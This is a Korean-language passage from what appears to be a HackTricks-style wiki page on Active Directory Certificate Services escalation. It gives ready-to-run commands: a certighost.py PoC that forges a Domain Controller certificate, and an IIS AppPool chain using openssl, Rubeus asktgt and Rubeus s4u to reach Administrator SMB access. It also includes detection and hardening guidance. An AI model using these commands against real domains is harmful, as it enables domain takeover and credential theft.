공개 PoC는 전체 chain을 자동화합니다:<sup>[[1]](#references)</sup>

1. attacker-controlled **machine account**를 생성하거나 재사용합니다.
2. `389` 및 `445`에서 **rogue LDAP 및 SMB/LSA listeners**를 시작합니다.
3. attacker-controlled **`cdc`** 및 target **`rmd`** attributes를 포함한 certificate request를 제출합니다.
4. CA가 controlled machine account로 rogue listeners에 authenticate하도록 한 뒤, identity lookups에 **target DC** attributes로 응답합니다.
5. CA-signed **DC certificate**를 받은 다음 이를 **PKINIT**에 사용합니다.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Useful runtime flags from the PoC:

- `--listener <ip>`: `cdc`에 광고되는 callback IP를 명시적으로 선택
- `--computer-name <NAME$>`: 새 계정을 생성하는 대신 기존 machine account 재사용

**Operational notes:**

- PoC는 **privileged ports** `389` 및 `445`에 bind하므로 **root** 권한이 필요합니다.
- Exploitation에 성공하면 **DC `.pfx`** 및 **Kerberos `.ccache`**가 로컬에 기록됩니다.
- 인증서가 **Domain Controller account**에 매핑되므로, 후속 작업으로 **certificate-based Kerberos auth**, **DCSync**, 복구한 **machine NT hash** 재사용 등이 가능합니다.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment to same-host Administrator

`ApplicationPoolIdentity`로 실행되는 IIS pool은 네트워크 리소스에 outbound access할 때 호스트의 **computer account**를 사용합니다. 따라서 `IIS AppPool\<POOL>`로서의 code execution은 로컬 token에서는 낮은 권한으로 유지되지만, CA가 `HOST$`로 인증하는 AD CS request를 제출할 수 있습니다. 이는 token impersonation이나 Potato-style local elevation이 아니라 outbound identity transition입니다.<sup>[[19]](#references)[[20]](#references)</sup>

이 chain에는 domain-joined IIS host, RPC를 통해 접근 가능한 Enterprise CA, computer에 enrollment rights가 있는 published machine-authentication template, PKINIT support, 그리고 KDC/SMB reachability가 필요합니다. custom pool identity는 outbound principal을 변경하므로, `HOST$`라고 가정하기 전에 pool이 실제로 `ApplicationPoolIdentity`를 사용하는지 확인해야 합니다.<sup>[[19]](#references)[[20]](#references)</sup>

### Attacker-controlled-key enrollment

IIS server 외부에서 key pair와 CSR을 생성하고 private key를 보관합니다. compromised worker에서는 **CSR만** 제출합니다. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)는 `CertificateAuthority.Request`를 instantiate하고, `CertificateTemplate:Machine`을 설정한 뒤 `ICertRequest::Submit`을 호출하여 발급된 인증서를 반환합니다. CA configuration string에는 `CAHOST\CA-NAME`을 사용합니다. 일반적인 `Machine` template은 AD에서 subject를 구성하므로 requester-supplied subject/SAN data가 필요하지 않습니다.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

반환된 인증서를 **matching retained key**와 결합합니다. `certutil -MergePFX machine_cert.cer machine_cert.pfx`는 Windows가 이미 인증서를 접근 가능한 private key와 연결할 수 있는 경우에만 작동합니다. 별도의 PEM 파일을 사용하는 경우에는 PKCS#12를 명시적으로 생성합니다:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
PFX를 PKINIT에 사용하고, 반환된 computer TGT는 즉시 주입하지 않고 base64로 유지합니다:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self 및 동일 호스트 서비스 대체

S4U2Self를 사용하면 서비스가 다른 사용자의 권한 데이터를 포함한 티켓을 **자기 자신에게** 요청할 수 있습니다. 컴퓨터 TGT가 있으면 Rubeus는 권한이 높은 사용자를 대상으로 해당 티켓을 요청하고, 반환된 KRB-CRED의 서비스 이름을 CIFS로 다시 작성한 다음 이를 주입할 수 있습니다. 이는 로컬 “자기 자신에게 위임” primitive이며, S4U2Proxy나 `msDS-AllowedToDelegateTo` 항목이 필요하지 않습니다.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
대체된 ticket은 **동일한 computer account/key**의 services만 사용할 수 있습니다(여기서는 `HOST`의 CIFS). 다른 domain 컴퓨터에서 재사용할 수 있는 Administrator ticket은 아닙니다. 또한 입증된 결과는 Administrator로서의 권한 있는 SMB/filesystem access이며, 로컬 `NT AUTHORITY\SYSTEM` process를 얻으려면 별도의 remote-execution 단계가 여전히 필요합니다.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### 탐지 및 hardening

- CA에서 Certification Services events **4886**(request received) 및 **4887**(issued)을 연계하여 IIS server accounts가 예상치 않게 `Machine`-template requests를 수행하는지 확인합니다.<sup>[[19]](#references)[[24]](#references)</sup>
- DC에서 certificate pre-authentication이 사용되면 event **4768**에 certificate fields가 포함됩니다. web-server accounts에 대한 비정상적인 PKINIT TGT requests를 alert 대상으로 지정합니다. 이후 privileged impersonated identity 및 동일한 host가 관련된 **4769** requests를 확인합니다. Rubeus `/altservice`는 client-side에서 KRB-CRED service name을 다시 작성하므로, DC-side 4769 service name이 `cifs`일 것을 요구해서는 안 됩니다.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- `w3wp.exe`가 CA RPC endpoints에 연결하는 행위, 예상치 못한 ASPX 생성, Kerberos-authenticated administrative shares access, secrets-dumping activity를 탐색합니다. 가능한 경우 app-tier의 CA RPC/KDC/SMB access를 제한하고, 운영상 필요하지 않은 computer enrollment rights 또는 machine-authentication templates를 제거합니다.<sup>[[19]](#references)</sup>

## Certificates를 통한 Forest Compromising 설명: 수동태

### Compromised CAs에 의한 Forest Trusts 파괴

**cross-forest enrollment**의 configuration은 비교적 간단하게 구성됩니다. resource forest의 **root CA certificate**는 administrators에 의해 **account forests에 publish**되고, resource forest의 **enterprise CA** certificates는 각 account forest의 **`NTAuthCertificates` 및 AIA containers에 추가**됩니다. 즉, 이 arrangement는 resource forest의 **CA가 PKI를 관리하는 다른 모든 forests를 완전히 control**할 수 있도록 합니다. 이 CA가 **attackers에 의해 compromised**되면 resource 및 account forests의 모든 users에 대한 certificates가 **그들에 의해 forged**될 수 있으며, 그 결과 forest의 security boundary가 무너지게 됩니다.<sup>[[6]](#references)</sup>

### Foreign Principals에 부여된 Enrollment Privileges

multi-forest environments에서는 **Authenticated Users 또는 foreign principals**(Enterprise CA가 속한 forest 외부의 users/groups)에게 **enrollment 및 edit rights**를 허용하는 **certificate templates를 publish**하는 Enterprise CAs에 주의해야 합니다.\
trust를 통한 authentication이 수행되면 AD가 사용자의 token에 **Authenticated Users SID**를 추가합니다. 따라서 domain에 **Authenticated Users enrollment rights를 허용하는 template**이 있는 경우, 다른 forest의 user가 해당 template에 **enroll**할 가능성이 있습니다. 마찬가지로 **template에 의해 foreign principal에 enrollment rights가 명시적으로 부여**되면 **cross-forest access-control relationship이 생성**되어, 한 forest의 principal이 다른 forest의 template에 **enroll**할 수 있게 됩니다.

두 시나리오 모두 한 forest에서 다른 forest으로 이어지는 **attack surface의 증가**를 초래합니다. certificate template의 settings는 attacker에 의해 악용되어 foreign domain에서 추가 privileges를 얻는 데 사용될 수 있습니다.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 PoC repository](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Abusing Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, New Authentication and Request Methods and more](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – The Tale of Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying to AD Certificate Services over RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Shell access to ADCS CA with YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Revisiting “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Privilege Escalation from IIS AppPool via the AD CS RPC Endpoint](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: A Kerberos authentication ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: A Kerberos service ticket was requested](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
